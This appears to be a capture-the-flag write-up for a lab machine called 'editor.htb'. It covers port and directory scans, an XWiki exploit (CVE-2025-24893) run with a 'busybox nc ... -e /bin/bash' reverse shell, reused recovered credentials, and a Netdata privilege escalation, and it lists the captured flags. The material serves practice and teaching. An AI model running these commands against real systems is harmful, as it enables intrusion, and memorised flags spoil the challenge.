@@ -1,0 +1,48 @@
+10.10.11.80
+
+sudo nmap -sS -p- -sU --top-ports 200 --min-rate 1500 -T4 -n --open -vv 10.10.11.80
+22/tcp   open  ssh        syn-ack ttl 63
+80/tcp   open  http       syn-ack ttl 63
+8080/tcp open  http-proxy syn-ack ttl 63
+
+website -
+contact@editor.htb
+simplistcode_1.0.deb
+
+gobuster dir -u http://editor.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,js,css,zip,tar.gz,bak -t 80 -e -k
+
+ffuf -u http://10.10.11.80/ -H "Host: FUZZ.<root-domain>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0
+
+Nothing on main site 
+
+http://wiki.editor.htb/xwiki/bin/view/Main/
+
+curl -s http://wiki.editor.htb/xwiki/bin/view/Main/ \
+| grep -oE 'xwiki-platform-[^/]+/[0-9.]{3,}' \
+| sed 's#.*/##' | sort -u
+
+version 15.10.8
+
+CVE-2025-24893 - https://github.com/gunzf0x/CVE-2025-24893.git
+
+python3 CVE-2025-24893.py -t 'http://wiki.editor.htb:8080' -c 'busybox nc <ur ip address> 9001 -e /bin/bash'
+
+nc -lvnp 9001 
+
+found:
+users oliver
+hibernate.cfg.xml
+user: xwiki
+password: theEd1t0rTeam99
+
+ssh -
+username:oliver password: theEd1t0rTeam99
+user flag : d658727ad75b5c111bf8ecd9b72dbf1c
+
+---------------------------------- escalation ----------------------------------
+id 999(netdata) exploitable
+
+CVE-2024-32019 - 
+https://github.com/dollarboysushil/CVE-2024-32019-Netdata-ndsudo-PATH-Vulnerability-Privilege-Escalation
+
+root flag - 519d741907a3d4669b469dace445f2d7
